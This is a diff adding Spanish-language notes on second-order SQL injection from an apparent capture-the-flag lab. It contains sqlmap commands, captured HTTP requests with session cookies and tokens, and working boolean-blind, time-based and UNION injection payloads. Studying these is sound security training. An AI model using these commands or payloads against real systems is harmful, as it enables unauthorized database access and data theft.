@@ -54,3 +54,79 @@
 - Dentro de los websockets se pueden realizar consultas SQL.
 - Hay que estar atento al burp proxy para ver las peticiones y respuestas.
 - sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "*"}' --dbs --threads 10 --level 5 --risk 3 --batch
+
+## Inyección SQL de Segundo Orden
+
+La inyección SQL de segundo orden ocurre cuando los datos inyectados no se utilizan de inmediato, sino que se almacenan en la base de datos y se procesan posteriormente en una consulta SQL de manera insegura.
+
+### Ejemplo:
+1. El atacante introduce datos maliciosos en un formulario que se almacenan en la base de datos.
+2. Más tarde, otra funcionalidad de la aplicación utiliza esos datos almacenados en una consulta SQL sin validarlos, permitiendo la explotación.
+
+- Este tipo de inyección es más difícil de detectar, ya que el impacto no es inmediato y depende de cómo la aplicación maneje los datos almacenados.
+
+- `sqlmap -r update_genres.req --second-req=user-feed.req  --dbs --level 5 --risk 3 --batch --tamper=space2comment --random-agent`
+- Siendo update_genres.req un archivo que contiene una petición HTTP POST de una api que actualiza algo, o sea que es muy probable que haga una consulta del tipo `UPDATE table SET column = value WHERE condition`.
+    - Y la segunda petición que practicamente hace GET user feed, o sea que recarga/fetchea/actualiza la información en la aplicación.
+
+
+### update_genres.req
+```http	
+POST /api/v1/gallery/user/genres HTTP/1.1
+Host: 10.10.11.220
+Content-Length: 17
+X-XSRF-TOKEN: eyJpdiI6ImdtZ0VkQXI0aUZtTUVVNzZxUnF6VlE9PSIsInZhbHVlIjoiYmZTRGVOWmptTVN3S2NldGlZNWtxdkozYUF0N25HWXVuazRuL0hBTGo0QnRaSCsrVWhMNkNuV1ltaUhvbkxDbFlTaVJueFcvdVhvamFLbE9wREgxZkEvdjA0L0J0bWxvSWNma2VUZ3JyWXYraG1Vb1VZeVVqNXV0bDBtUStib0ciLCJtYWMiOiJjNWU2ZDkwYWM1MGQ3NDQ4MjE2ZTZhYmU0ZjRkNzU5NDhjZTNhODEzNzA1ZDlmY2UwOWNjNDM1OGYwYzdkMTdiIiwidGFnIjoiIn0=
+X-Requested-With: XMLHttpRequest
+Accept-Language: en-US,en;q=0.9
+Accept: application/json, text/plain, */*
+Content-Type: application/json
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
+Origin: http://10.10.11.220
+Referer: http://10.10.11.220/gallery
+Accept-Encoding: gzip, deflate, br
+Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92MS9hdXRoL2xvZ2luIiwiaWF0IjoxNzQ0MDQ3MzcwLCJleHAiOjE3NDQwNjg5NzAsIm5iZiI6MTc0NDA0NzM3MCwianRpIjoiNDB3T0RMR2l1Qkp1aFczTyIsInN1YiI6IjI4IiwicHJ2IjoiMjNiZDVjODk0OWY2MDBhZGIzOWU3MDFjNDAwODcyZGI3YTU5NzZmNyJ9.N18GEbvP-Lpdcm-w0VsyqQ-Ihbyu5KYNq9obdXn65Aw; XSRF-TOKEN=eyJpdiI6ImdtZ0VkQXI0aUZtTUVVNzZxUnF6VlE9PSIsInZhbHVlIjoiYmZTRGVOWmptTVN3S2NldGlZNWtxdkozYUF0N25HWXVuazRuL0hBTGo0QnRaSCsrVWhMNkNuV1ltaUhvbkxDbFlTaVJueFcvdVhvamFLbE9wREgxZkEvdjA0L0J0bWxvSWNma2VUZ3JyWXYraG1Vb1VZeVVqNXV0bDBtUStib0ciLCJtYWMiOiJjNWU2ZDkwYWM1MGQ3NDQ4MjE2ZTZhYmU0ZjRkNzU5NDhjZTNhODEzNzA1ZDlmY2UwOWNjNDM1OGYwYzdkMTdiIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IlJXOWRQK0tJbk1jaUhCZDRLYktQV2c9PSIsInZhbHVlIjoiYWh4TGJYb1BjcnhMN2VVMWp2YzJiSkJoc0lRbjEzRVgxalc3Sm9aUUoyVktwaG9vZUdyWmpqYTZVTjc1bUQ2VFExUDd0UTVXTVdRMkxTaExsNGdVR0kvUTMxNzNwQlloS25yczJvUHlFelFobVQ2YWo1ZzVOQUdxRE9HM28xdTciLCJtYWMiOiJiN2U3MmNlOWI3ODYzNDE0ZTNhNDlkMDBiNmUzYTcyN2EwZGM1NTA2Yjc0MDMzOWU4NDkyODg2Zjc5N2YwNTUyIiwidGFnIjoiIn0%3D
+Connection: keep-alive
+
+{"genres":"test"}
+``` 
+
+### user-feed.req
+```http
+GET /api/v1/gallery/user/feed HTTP/1.1
+Host: 10.10.11.220
+X-XSRF-TOKEN: eyJpdiI6Im9JNktoUVE1cjA0NWpVMWlMcVdkbkE9PSIsInZhbHVlIjoiandkUFV2YTJIbTYwRjBiR0UyWG9HOUkxa1VtcDNJNGx4TWJDbU1FRnVURERWdThtdkR3TzJ4eXdENVNzcnNJcFpZanpWeFBPbzd1bUxHcVJzd0V4UmNsR0FDd29UbVNKVDcvUmtJN3BoVnBORnRxcHljTmJGTFdKbFFSOHF6MTciLCJtYWMiOiIwMGFhODg1NjcwZmExZDllMjNkYWQ2MzYwM2I2YjBkMjk4ZmNiZDBiZDZhOWMyOGE0NTMxOTViYjA3Y2UwNTVkIiwidGFnIjoiIn0=
+X-Requested-With: XMLHttpRequest
+Accept-Language: en-US,en;q=0.9
+Accept: application/json, text/plain, */*
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
+Referer: http://10.10.11.220/gallery
+Accept-Encoding: gzip, deflate, br
+Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92MS9hdXRoL2xvZ2luIiwiaWF0IjoxNzQ0MDQ3MzcwLCJleHAiOjE3NDQwNjg5NzAsIm5iZiI6MTc0NDA0NzM3MCwianRpIjoiNDB3T0RMR2l1Qkp1aFczTyIsInN1YiI6IjI4IiwicHJ2IjoiMjNiZDVjODk0OWY2MDBhZGIzOWU3MDFjNDAwODcyZGI3YTU5NzZmNyJ9.N18GEbvP-Lpdcm-w0VsyqQ-Ihbyu5KYNq9obdXn65Aw; XSRF-TOKEN=eyJpdiI6Im9JNktoUVE1cjA0NWpVMWlMcVdkbkE9PSIsInZhbHVlIjoiandkUFV2YTJIbTYwRjBiR0UyWG9HOUkxa1VtcDNJNGx4TWJDbU1FRnVURERWdThtdkR3TzJ4eXdENVNzcnNJcFpZanpWeFBPbzd1bUxHcVJzd0V4UmNsR0FDd29UbVNKVDcvUmtJN3BoVnBORnRxcHljTmJGTFdKbFFSOHF6MTciLCJtYWMiOiIwMGFhODg1NjcwZmExZDllMjNkYWQ2MzYwM2I2YjBkMjk4ZmNiZDBiZDZhOWMyOGE0NTMxOTViYjA3Y2UwNTVkIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IjBlMDYybXlIRklhZHdVU0UrdGtFNEE9PSIsInZhbHVlIjoibEc5VU9FNDhISDdzUXdpYTJlcVBLK0xrbVhkeEVScndZVGcvRTl6Rm1iOVE3REV5bys2djdXWEQ4K0treVRWMEFzZkoxSGNmTTFwRzVraU1VYzBzRUpEcDM2WkxFT2xpUnFNVUFrVFQ2YktuT3hUQ3pkUkhSZCtWbDNvOXlCVi8iLCJtYWMiOiJkY2E0YmFmMWExZDdiZTcxNjUyZDUyZDE2MWMyZjk4OGUzZjM3NjZkNGY0ZWI2YmIwMTIzOTJmYzc4ODFmNjZiIiwidGFnIjoiIn0%3D
+Connection: keep-alive
+```
+
+### Payloads
+``` 
+---
+Parameter: JSON genres ((custom) POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: {"genres":"test') OR NOT 5455=5455 AND ('QYvP'='QYvP"}
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: {"genres":"test') AND (SELECT 5404 FROM (SELECT(SLEEP(5)))LAtK) AND ('ClJK'='ClJK"}
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 5 columns
+    Payload: {"genres":"test') UNION ALL SELECT NULL,CONCAT(0x7162787071,0x4a4268414d737150586b687553784e4d757851796e6c724c68666a646d4c4c706e78736c51435370,0x7171627671),NULL,NULL,NULL#"}
+---
+```
+
+- Entonces el comportamiento de la aplicación es el siguiente:
+    - Actualizas los géneros de un usuario, y luego haces un GET a la api de user feed.
+    - La aplicación hace un SELECT a la base de datos para obtener los géneros del usuario y mostrarlos en la aplicación.
+- La inyección SQL de segundo orden se produce cuando la aplicación almacena los datos inyectados en la base de datos y luego los utiliza en una consulta SQL sin validarlos.
+- petición POST => Guardas una inyección SQL en la base de datos.
+- petición GET => La aplicación hace un SELECT a la base de datos y muestra los datos inyectados en la aplicación.
+- La inyección SQL de segundo orden se produce cuando la aplicación almacena los datos inyectados en la base de datos y luego los utiliza en una consulta SQL sin validarlos.
